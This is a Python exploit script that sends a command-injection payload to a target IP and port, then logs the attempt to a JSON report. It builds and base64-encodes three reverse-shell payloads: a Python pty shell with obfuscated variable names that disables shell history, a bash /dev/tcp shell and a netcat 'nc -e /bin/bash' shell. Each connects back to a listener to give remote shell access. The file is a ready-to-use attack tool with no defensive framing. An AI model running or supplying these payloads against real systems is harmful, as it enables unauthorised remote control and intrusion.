#!/usr/bin/python3
import argparse
import socket
import base64
import json
import os
from datetime import datetime

# Sets the target ip and port from argparse
parser = argparse.ArgumentParser()
parser.add_argument('ip', help='target ip')
parser.add_argument('port', help='target port', type=int)
parser.add_argument('-payload', help='set payload type', required=True, choices=['python', 'netcat', 'bash'])
args = parser.parse_args()

# Sets the local ip and port (address and port to listen on)
local_ip = input("enter the local ip : ")  # CHANGE THIS
local_port = int(input("enter the local port : ")) # CHANGE THIS

# The different types of payloads that are supported
python_payload = f'python -c "import os;import pty;import socket;tLnCwQLCel=\'{local_ip}\';EvKOcV={local_port};QRRCCltJB=socket.socket(socket.AF_INET,socket.SOCK_STREAM);QRRCCltJB.connect((tLnCwQLCel,EvKOcV));os.dup2(QRRCCltJB.fileno(),0);os.dup2(QRRCCltJB.fileno(),1);os.dup2(QRRCCltJB.fileno(),2);os.putenv(\'HISTFILE\',\'/dev/null\');pty.spawn(\'/bin/bash\');QRRCCltJB.close();" '
bash_payload = f'bash -i >& /dev/tcp/{local_ip}/{local_port} 0>&1'
netcat_payload = f'nc -e /bin/bash {local_ip} {local_port}'

# our socket to interact with and send payload
try:
    s = socket.create_connection((args.ip, args.port))
except socket.error as error:
    print('connection to target failed...')
    print(error)
    sys.exit(1)

# craft out payload and then it gets base64 encoded
def gen_payload(payload_type):
    base = base64.b64encode(payload_type.encode())
    return f'echo {base.decode()} |base64 -d|/bin/bash'

# all the different payload options to be sent
payload_sent = None
if args.payload == 'python':
    payload_sent = gen_payload(python_payload)
    try:
        s.sendall((f'AB; {payload_sent} \n').encode())
    except:
        print('connection made, but failed to send exploit...')
        sys.exit(1)

if args.payload == 'netcat':
    payload_sent = gen_payload(netcat_payload)
    try:
        s.sendall((f'AB; {payload_sent} \n').encode())
    except:
        print('connection made, but failed to send exploit...')
        sys.exit(1)

if args.payload == 'bash':
    payload_sent = gen_payload(bash_payload)
    try:
        s.sendall((f'AB; {payload_sent} \n').encode())
    except:
        print('connection made, but failed to send exploit...')
        sys.exit(1)

# check display any response from the server
data = s.recv(1024)
s.close()

result = {
    "timestamp": datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
    "target_ip": args.ip,
    "target_port": args.port,
    "local_ip": local_ip,
    "local_port": local_port,
    "payload_type": args.payload,
    "payload_sent": payload_sent,
    "response": data.decode() if data else "No response"
}

# Save the result to the file 'report/exploit.json'
file_path = 'report/exploit.json'
if os.path.exists(file_path):
    with open(file_path, 'r') as file:
        try:
            existing_data = json.load(file)
        except json.JSONDecodeError:
            existing_data = []
else:
    existing_data = []

existing_data.append(result)

with open(file_path, 'w') as file:
    json.dump(existing_data, file, indent=4)

if data:
    print('Exploit sent successfully!')
else:
    print('No response received.')